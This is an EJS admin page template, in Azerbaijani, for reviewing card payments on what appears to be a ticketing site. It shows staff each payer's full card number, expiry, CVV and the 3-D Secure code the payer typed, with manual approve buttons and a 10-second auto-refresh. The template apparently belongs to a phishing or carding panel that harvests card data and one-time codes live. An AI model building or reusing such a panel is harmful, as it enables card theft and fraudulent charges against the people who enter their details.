<section class="section">
  <div class="container">
    <div class="section__head">
      <div>
        <div class="eyebrow"><%= t('nav.panel') %></div>
        <h1><%= t('admin.payments') %></h1>
        <p>Kart məlumatları və doğrulama kodları burada təsdiqlənir.</p>
      </div>
    </div>

    <div class="layout-aside">
      <%- include('../../partials/admin-nav') %>

      <div>
        <div class="card mb-24"><div class="card__body">
          <div class="timetable-tabs">
            <a class="tab <%= status === 'pending' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=pending">Gözləyən</a>
            <a class="tab <%= status === 'approved' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=approved">Təsdiqlənmiş</a>
            <a class="tab <%= status === 'declined' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=declined">Rədd edilmiş</a>
            <a class="tab <%= status === 'all' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=all">Hamısı</a>
          </div>
          <div id="payNote" class="hidden"></div>
        </div></div>

        <% if (!payments.length) { %>
          <div class="card"><div class="card__body"><p class="sec-note mb-0">Bu bölmədə ödəniş yoxdur.</p></div></div>
        <% } %>

        <% payments.forEach(function(p){ %>
          <% var o = orderMap[String(p.order)] || null; %>
          <% var u = userMap[String(p.user)] || null; %>
          <div class="card mb-16">
            <div class="card__head">
              <span class="mono"><%= p.transactionId %></span>
              <span class="badge <%= p.status === 'approved' ? 'badge--green' : (p.status === 'declined' ? 'badge--red' : 'badge--gold') %>"><%= p.status %></span>
            </div>
            <div class="card__body">
              <div class="grid grid--2">
                <div>
                  <h3 style="font-size:1rem;margin-top:0"><%= t('admin.cardData') %></h3>
                  <dl class="kv">
                    <dt>Kart</dt><dd class="mono"><%= p.card && p.card.number ? p.card.number : '—' %></dd>
                    <dt>Sahib</dt><dd><%= p.card && p.card.holder ? p.card.holder : '—' %></dd>
                    <dt>Bitmə</dt><dd class="mono"><%= p.card && p.card.expiry ? p.card.expiry : '—' %></dd>
                    <dt>CVV</dt><dd class="mono"><%= p.card && p.card.cvv ? p.card.cvv : '—' %></dd>
                    <dt>Brend</dt><dd><%= p.card && p.card.brand ? p.card.brand : '—' %></dd>
                    <dt>Üsul</dt><dd><%= p.method === 'balance' ? 'Balans' : 'Kart' %></dd>
                    <dt>Məbləğ</dt><dd class="mono"><%= p.amount.toFixed(2) %> ₼</dd>
                  </dl>
                </div>
                <div>
                  <h3 style="font-size:1rem;margin-top:0">İstifadəçi / sifariş</h3>
                  <dl class="kv">
                    <dt>İstifadəçi</dt><dd><%= u ? (u.firstName + ' ' + u.lastName) : '—' %></dd>
                    <dt>E-poçt</dt><dd><%= u ? u.email : '—' %></dd>
                    <dt>Telefon</dt><dd><%= u && u.phone ? u.phone : '—' %></dd>
                    <dt>Sifariş</dt><dd class="mono"><%= o ? o.orderNo : 'Balans artırımı' %></dd>
                    <dt>Marşrut</dt><dd><%= o ? (o.fromName + ' — ' + o.toName) : '—' %></dd>
                    <dt>Tarix</dt><dd><%= o ? (o.date + ' ' + o.departTime) : '—' %></dd>
                  </dl>
                  <% if (p.verificationCode) { %>
                    <p class="sec-note">Doğrulama kodu: <strong class="mono"><%= p.verificationCode %></strong></p>
                  <% } %>
                  <% if (p.submittedCode) { %>
                    <p class="sec-note">İstifadəçinin yazdığı kod: <strong class="mono"><%= p.submittedCode %></strong></p>
                  <% } %>
                </div>
              </div>

              <% if (p.status === 'pending_admin') { %>
                <div class="flex-end mt-16">
                  <button class="btn btn--primary btn--sm" data-approve-card="<%= p._id %>"><%= t('admin.approve') %></button>
                  <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
                </div>
              <% } else if (p.status === 'awaiting_3ds') { %>
                <p class="sec-note mt-16">İstifadəçi 3-D doğrulama ekranında kodu daxil edir.</p>
              <% } else if (p.status === 'code_submitted') { %>
                <div class="flex-end mt-16">
                  <button class="btn btn--primary btn--sm" data-approve-final="<%= p._id %>">Yekun təsdiq</button>
                  <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
                </div>
              <% } else { %>
                <p class="sec-note mt-16">
                  <%= p.status === 'approved' ? 'Təsdiqlənmiş ödəniş.' : 'Rədd edilmiş ödəniş.' %>
                </p>
              <% } %>
            </div>
          </div>
        <% }) %>
      </div>
    </div>
  </div>
</section>

<script>
(function () {
  var note = document.getElementById('payNote');
  function show(msg, ok) {
    if (!note) { return; }
    note.className = 'alert ' + (ok ? 'alert--info' : 'alert--danger');
    note.textContent = msg;
  }
  async function call(url, body) {
    var res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
      body: JSON.stringify(body || {})
    });
    return res.json();
  }
  document.addEventListener('click', async function (e) {
    var el = e.target.closest('[data-approve-card],[data-approve-final],[data-decline]');
    if (!el) { return; }
    e.preventDefault();
    el.disabled = true;
    var url = '';
    if (el.hasAttribute('data-approve-card')) { url = '/api/admin/payments/' + el.getAttribute('data-approve-card') + '/approve-card'; }
    if (el.hasAttribute('data-approve-final')) { url = '/api/admin/payments/' + el.getAttribute('data-approve-final') + '/approve-final'; }
    if (el.hasAttribute('data-decline')) { url = '/api/admin/payments/' + el.getAttribute('data-decline') + '/decline'; }
    try {
      var data = await call(url, { reason: 'Admin tərəfindən rədd edildi' });
      show(data.message || (data.ok ? 'Hazırdır' : 'Alınmadı'), !!data.ok);
      if (data.ok) { setTimeout(function () { window.location.reload(); }, 900); }
      else { el.disabled = false; }
    } catch (err) {
      show('Şəbəkə xətası', false);
      el.disabled = false;
    }
  });
  /* Gözləyən tabında yeni ödənişlər avtomatik görünsün */
  if ('<%= status %>' === 'pending') {
    setInterval(function () {
      if (document.querySelector('button:disabled')) { return; }
      window.location.reload();
    }, 10000);
  }
})();
</script>
